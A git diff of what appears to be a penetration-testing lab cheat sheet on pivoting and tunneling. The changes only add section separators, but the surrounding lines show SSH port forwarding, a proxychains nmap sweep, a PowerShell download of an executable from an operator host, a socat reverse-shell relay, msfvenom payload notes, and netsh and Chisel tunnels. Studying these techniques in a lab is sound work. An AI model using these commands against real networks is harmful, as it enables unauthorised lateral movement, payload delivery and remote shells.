@@ -11,6 +11,8 @@ $ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
 $ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
 ```
 
+* * *
+
 # Dynamic Port Forwarding
 ```bash
 $ ssh -D 9050 ubuntu@10.129.202.64
@@ -27,6 +29,8 @@ socks4 	127.0.0.1 9050
 ```bash
 $ proxychains nmap -v -sn 172.16.5.1-200
 ```
+
+* * *
 
 # Remote/Reverse Port Forwarding with SSH
 ```bash
@@ -60,6 +64,8 @@ PS > Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile
 $ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
 ```
 
+* * *
+
 # [Socat](https://linux.die.net/man/1/socat) Redirection
 ## Reverse Shell
 ```bash
@@ -75,10 +81,14 @@ $ socat TCP4-LISTEN:<FORWARD_PORT>,fork TCP4:<OUR_IP:OUR_PORT>
 - Generate reverse msfvenom payload set LHOST has the pivot machine
 - Set LHOST = 0.0.0.0 on msfconsole
 
+* * *
+
 # Port Forwarding with Windows Netsh
 ```
 C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
 ```
+
+* * *
 
 # SOCKS5 Tunneling with Chisel
 `Find PID to kill`
@@ -94,6 +104,8 @@ $ chisel server --socks5 --reverse`
 # Remote machine
 ./chisel client --fingerprint f9KLbYov18MaH86fvgZhbVMyTAj4LAT6Iv8E8Nlwy0k= 10.10.15.23:8080 R:8081:127.0.0.1:445
 ```
+
+* * *
 
 # [Ligolo-ng](https://github.com/nicocha30/ligolo-ng)
 
